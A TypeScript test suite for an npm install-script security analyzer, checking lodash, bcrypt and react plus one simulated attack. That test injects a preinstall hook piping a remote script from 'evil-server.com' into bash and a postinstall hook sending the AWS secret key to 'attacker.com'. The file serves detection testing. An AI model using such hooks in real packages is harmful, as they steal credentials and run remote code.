/**
 * Test script for Install Scripts (Capabilities) Check Feature
 * 
 * Tests the script capabilities analyzer against:
 * 1. Healthy packages (no install scripts) - react, lodash
 * 2. Native modules (node-gyp rebuild) - bcrypt
 * 3. Simulated malicious attack (injected curl | bash)
 * 
 * Run with: npx tsx src/test-script-capabilities.ts
 */

import * as pacote from 'pacote';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { analyzeScriptCapabilities, ScriptCapabilitiesResult } from './script-capabilities';

interface TestResult {
    testName: string;
    packageName: string;
    result: ScriptCapabilitiesResult;
    expected: 'pass' | 'warning' | 'fail';
    testPassed: boolean;
    notes?: string;
}

/**
 * Clean up temporary directory
 */
function cleanupTempDir(tmpDir: string): void {
    try {
        if (fs.existsSync(tmpDir)) {
            fs.rmSync(tmpDir, { recursive: true, force: true });
        }
    } catch (error) {
        console.warn(`Failed to cleanup temp directory ${tmpDir}:`, error);
    }
}

/**
 * Test 1: Healthy Package Test (No Install Scripts)
 * Tests lodash - a pure JS library with no lifecycle scripts
 */
async function runHealthyTest(): Promise<TestResult> {
    const packageName = 'lodash';
    const version = '4.17.21';

    console.log('\n' + '='.repeat(60));
    console.log('🧪 TEST 1: HEALTHY PACKAGE TEST (No Install Scripts)');
    console.log('='.repeat(60));
    console.log(`📦 Package: ${packageName}@${version}`);
    console.log('Expected: PASS (no lifecycle scripts)');
    console.log('');

    const safeName = packageName.replace(/[^a-zA-Z0-9-_]/g, '-');
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(7);
    const tmpDir = path.join(os.tmpdir(), `test-scripts-healthy-${safeName}-${timestamp}-${random}`);

    try {
        // Download npm tarball
        console.log('📦 Downloading npm tarball...');
        fs.mkdirSync(tmpDir, { recursive: true });
        await pacote.extract(`${packageName}@${version}`, tmpDir);
        console.log(`✅ npm tarball extracted to ${tmpDir}`);

        // Show package.json scripts section
        const pkgPath = path.join(tmpDir, 'package.json');
        const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf-8'));
        console.log('\n📄 package.json scripts:');
        console.log(JSON.stringify(pkg.scripts || {}, null, 2));

        // Analyze script capabilities
        console.log('\n🔍 Analyzing script capabilities...');
        const result = analyzeScriptCapabilities(tmpDir);

        const testPassed = result.status === 'pass';

        return {
            testName: 'Healthy Package Test (No Install Scripts)',
            packageName: `${packageName}@${version}`,
            result,
            expected: 'pass',
            testPassed,
            notes: testPassed
                ? '✨ No lifecycle scripts detected - package is clean!'
                : `❌ Unexpected: Found ${result.detectedScripts.length} scripts`,
        };
    } catch (error: any) {
        return {
            testName: 'Healthy Package Test (No Install Scripts)',
            packageName: `${packageName}@${version}`,
            result: {
                status: 'warning',
                detectedScripts: [],
                hasNetworkAccess: false,
                hasShellExecution: false,
                hasDangerousPatterns: false,
                dangerousPatterns: [],
            },
            expected: 'pass',
            testPassed: false,
            notes: `Error: ${error.message}`,
        };
    } finally {
        cleanupTempDir(tmpDir);
    }
}

/**
 * Test 2: Native Module Test (node-gyp rebuild)
 * Tests bcrypt - a native module that uses node-gyp for compilation
 */
async function runNativeModuleTest(): Promise<TestResult> {
    const packageName = 'bcrypt';
    const version = '5.1.1';

    console.log('\n' + '='.repeat(60));
    console.log('🧪 TEST 2: NATIVE MODULE TEST (node-gyp rebuild)');
    console.log('='.repeat(60));
    console.log(`📦 Package: ${packageName}@${version}`);
    console.log('Expected: WARNING or PASS (node-gyp is legitimate)');
    console.log('');

    const safeName = packageName.replace(/[^a-zA-Z0-9-_]/g, '-');
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(7);
    const tmpDir = path.join(os.tmpdir(), `test-scripts-native-${safeName}-${timestamp}-${random}`);

    try {
        // Download npm tarball
        console.log('📦 Downloading npm tarball...');
        fs.mkdirSync(tmpDir, { recursive: true });
        await pacote.extract(`${packageName}@${version}`, tmpDir);
        console.log(`✅ npm tarball extracted to ${tmpDir}`);

        // Show package.json scripts section
        const pkgPath = path.join(tmpDir, 'package.json');
        const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf-8'));
        console.log('\n📄 package.json scripts:');
        console.log(JSON.stringify(pkg.scripts || {}, null, 2));

        // Analyze script capabilities
        console.log('\n🔍 Analyzing script capabilities...');
        const result = analyzeScriptCapabilities(tmpDir);

        // For native modules, warning is acceptable (node-gyp is legitimate)
        const testPassed = result.status === 'pass' || result.status === 'warning';

        return {
            testName: 'Native Module Test (node-gyp rebuild)',
            packageName: `${packageName}@${version}`,
            result,
            expected: 'warning',
            testPassed,
            notes: testPassed
                ? '✅ Native module detected with legitimate install script'
                : `❌ Unexpected FAIL status for native module`,
        };
    } catch (error: any) {
        return {
            testName: 'Native Module Test (node-gyp rebuild)',
            packageName: `${packageName}@${version}`,
            result: {
                status: 'warning',
                detectedScripts: [],
                hasNetworkAccess: false,
                hasShellExecution: false,
                hasDangerousPatterns: false,
                dangerousPatterns: [],
            },
            expected: 'warning',
            testPassed: false,
            notes: `Error: ${error.message}`,
        };
    } finally {
        cleanupTempDir(tmpDir);
    }
}

/**
 * Test 3: Simulated Attack Test (Malicious Script Injection)
 * Uses lodash and injects malicious preinstall script
 */
async function runSimulatedAttackTest(): Promise<TestResult> {
    const packageName = 'lodash';
    const version = '4.17.21';

    console.log('\n' + '='.repeat(60));
    console.log('🚨 TEST 3: SIMULATED ATTACK TEST (Malicious Injection)');
    console.log('='.repeat(60));
    console.log(`📦 Package: ${packageName}@${version}`);
    console.log('⚠️ Will inject malicious preinstall script');
    console.log('Expected: FAIL (should detect network + shell execution)');
    console.log('');

    const safeName = packageName.replace(/[^a-zA-Z0-9-_]/g, '-');
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(7);
    const tmpDir = path.join(os.tmpdir(), `test-scripts-attack-${safeName}-${timestamp}-${random}`);

    try {
        // Download npm tarball
        console.log('📦 Downloading npm tarball...');
        fs.mkdirSync(tmpDir, { recursive: true });
        await pacote.extract(`${packageName}@${version}`, tmpDir);
        console.log(`✅ npm tarball extracted to ${tmpDir}`);

        // 🚨 INJECT MALICIOUS SCRIPT (Red Team Simulation)
        console.log('');
        console.log('🚨🚨🚨 INJECTING MALICIOUS SCRIPT 🚨🚨🚨');
        console.log('');

        const pkgPath = path.join(tmpDir, 'package.json');
        const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf-8'));

        // Inject the "Protestware" style attack (like node-ipc malware)
        pkg.scripts = {
            ...pkg.scripts,
            preinstall: 'curl -s http://evil-server.com/payload.sh | bash',
            postinstall: 'node -e "require(\'https\').get(\'http://attacker.com/steal?data=\'+process.env.AWS_SECRET_KEY)"',
        };

        fs.writeFileSync(pkgPath, JSON.stringify(pkg, null, 2));
        console.log('💉 Injected malicious preinstall: curl -s http://evil-server.com/payload.sh | bash');
        console.log('💉 Injected malicious postinstall: node -e "require(\'https\').get(...)"');

        console.log('');
        console.log('🚨🚨🚨 INJECTION COMPLETE 🚨🚨🚨');
        console.log('');

        // Show modified package.json scripts section
        console.log('📄 Modified package.json scripts:');
        console.log(JSON.stringify(pkg.scripts, null, 2));

        // Analyze script capabilities
        console.log('\n🔍 Analyzing script capabilities...');
        const result = analyzeScriptCapabilities(tmpDir);

        // Should FAIL due to network access + shell execution
        const testPassed = result.status === 'fail';

        return {
            testName: 'Simulated Attack Test (Malicious Injection)',
            packageName: `${packageName}@${version} (MODIFIED)`,
            result,
            expected: 'fail',
            testPassed,
            notes: testPassed
                ? '🎯 Successfully detected malicious script patterns!'
                : `❌ Failed to detect malicious injection (got ${result.status} instead of fail)`,
        };
    } catch (error: any) {
        return {
            testName: 'Simulated Attack Test (Malicious Injection)',
            packageName: `${packageName}@${version}`,
            result: {
                status: 'warning',
                detectedScripts: [],
                hasNetworkAccess: false,
                hasShellExecution: false,
                hasDangerousPatterns: false,
                dangerousPatterns: [],
            },
            expected: 'fail',
            testPassed: false,
            notes: `Error: ${error.message}`,
        };
    } finally {
        cleanupTempDir(tmpDir);
    }
}

/**
 * Test 4: Additional Healthy Package Test (react)
 */
async function runReactTest(): Promise<TestResult> {
    const packageName = 'react';
    const version = '18.2.0';

    console.log('\n' + '='.repeat(60));
    console.log('🧪 TEST 4: ADDITIONAL HEALTHY PACKAGE (react)');
    console.log('='.repeat(60));
    console.log(`📦 Package: ${packageName}@${version}`);
    console.log('Expected: PASS (no lifecycle scripts)');
    console.log('');

    const safeName = packageName.replace(/[^a-zA-Z0-9-_]/g, '-');
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(7);
    const tmpDir = path.join(os.tmpdir(), `test-scripts-react-${safeName}-${timestamp}-${random}`);

    try {
        // Download npm tarball
        console.log('📦 Downloading npm tarball...');
        fs.mkdirSync(tmpDir, { recursive: true });
        await pacote.extract(`${packageName}@${version}`, tmpDir);
        console.log(`✅ npm tarball extracted to ${tmpDir}`);

        // Show package.json scripts section
        const pkgPath = path.join(tmpDir, 'package.json');
        const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf-8'));
        console.log('\n📄 package.json scripts:');
        console.log(JSON.stringify(pkg.scripts || {}, null, 2));

        // Analyze script capabilities
        console.log('\n🔍 Analyzing script capabilities...');
        const result = analyzeScriptCapabilities(tmpDir);

        const testPassed = result.status === 'pass';

        return {
            testName: 'Additional Healthy Package (react)',
            packageName: `${packageName}@${version}`,
            result,
            expected: 'pass',
            testPassed,
            notes: testPassed
                ? '✨ No lifecycle scripts detected - package is clean!'
                : `❌ Unexpected: Found ${result.detectedScripts.length} scripts`,
        };
    } catch (error: any) {
        return {
            testName: 'Additional Healthy Package (react)',
            packageName: `${packageName}@${version}`,
            result: {
                status: 'warning',
                detectedScripts: [],
                hasNetworkAccess: false,
                hasShellExecution: false,
                hasDangerousPatterns: false,
                dangerousPatterns: [],
            },
            expected: 'pass',
            testPassed: false,
            notes: `Error: ${error.message}`,
        };
    } finally {
        cleanupTempDir(tmpDir);
    }
}

/**
 * Print detailed test result
 */
function printResult(result: TestResult): void {
    console.log('\n' + '-'.repeat(60));
    console.log(`📋 RESULT: ${result.testName}`);
    console.log('-'.repeat(60));

    const statusEmoji = result.result.status === 'pass' ? '🟢' : result.result.status === 'warning' ? '🟡' : '🔴';
    console.log(`Package: ${result.packageName}`);
    console.log(`Status: ${statusEmoji} ${result.result.status.toUpperCase()}`);
    console.log(`Detected Scripts: ${result.result.detectedScripts.length}`);

    if (result.result.detectedScripts.length > 0) {
        console.log('\nLifecycle Scripts Found:');
        for (const script of result.result.detectedScripts) {
            console.log(`  📜 ${script.stage}: ${script.command}`);
        }
    }

    console.log(`\nSecurity Flags:`);
    console.log(`  🌐 Network Access: ${result.result.hasNetworkAccess ? '⚠️ YES' : '✅ NO'}`);
    console.log(`  💻 Shell Execution: ${result.result.hasShellExecution ? '⚠️ YES' : '✅ NO'}`);
    console.log(`  ⚠️ Dangerous Patterns: ${result.result.hasDangerousPatterns ? '🚨 YES' : '✅ NO'}`);

    if (result.result.dangerousPatterns.length > 0) {
        console.log('\nDangerous Patterns Detected:');
        for (const pattern of result.result.dangerousPatterns) {
            console.log(`  🚨 ${pattern}`);
        }
    }

    if (result.notes) {
        console.log(`\n📝 Notes: ${result.notes}`);
    }

    console.log('');
    console.log(`Expected: ${result.expected.toUpperCase()}`);
    console.log(`Actual: ${result.result.status.toUpperCase()}`);

    if (result.testPassed) {
        console.log(`\n✅ TEST PASSED!`);
    } else {
        console.log(`\n❌ TEST FAILED!`);
    }
}

/**
 * Main test runner
 */
async function runTests(): Promise<void> {
    console.log('\n' + '='.repeat(60));
    console.log('🔬 INSTALL SCRIPTS (CAPABILITIES) CHECK TEST SUITE');
    console.log('='.repeat(60));
    console.log('Testing the Watchtower Script Capabilities Analyzer');
    console.log('This tests healthy, native, and malicious packages');
    console.log('');

    const results: TestResult[] = [];

    // Run Test 1: Healthy Package (lodash)
    const healthyResult = await runHealthyTest();
    printResult(healthyResult);
    results.push(healthyResult);

    // Run Test 2: Native Module (bcrypt)
    const nativeResult = await runNativeModuleTest();
    printResult(nativeResult);
    results.push(nativeResult);

    // Run Test 3: Simulated Attack
    const attackResult = await runSimulatedAttackTest();
    printResult(attackResult);
    results.push(attackResult);

    // Run Test 4: Additional Healthy (react)
    const reactResult = await runReactTest();
    printResult(reactResult);
    results.push(reactResult);

    // Final Summary
    console.log('\n' + '='.repeat(60));
    console.log('📊 FINAL TEST SUMMARY');
    console.log('='.repeat(60));

    let allPassed = true;
    for (const result of results) {
        const emoji = result.testPassed ? '✅' : '❌';
        const statusEmoji = result.result.status === 'pass' ? '🟢' : result.result.status === 'warning' ? '🟡' : '🔴';
        console.log(`${emoji} ${result.testName}`);
        console.log(`   ${statusEmoji} Status: ${result.result.status.toUpperCase()} (Expected: ${result.expected.toUpperCase()})`);
        if (result.notes) {
            console.log(`   📝 ${result.notes}`);
        }
        if (!result.testPassed) allPassed = false;
    }

    console.log('');
    if (allPassed) {
        console.log('🎉 ALL TESTS PASSED! Install Scripts check feature is working correctly.');
        console.log('');
        console.log('✅ Healthy packages (lodash, react) show PASS status');
        console.log('✅ Native modules (bcrypt) show WARNING status (legitimate)');
        console.log('✅ Malicious script injection is detected as FAIL status');
    } else {
        console.log('⚠️ SOME TESTS FAILED. Please review the results above.');
    }
    console.log('');
}

// Run the tests
runTests().catch(console.error);
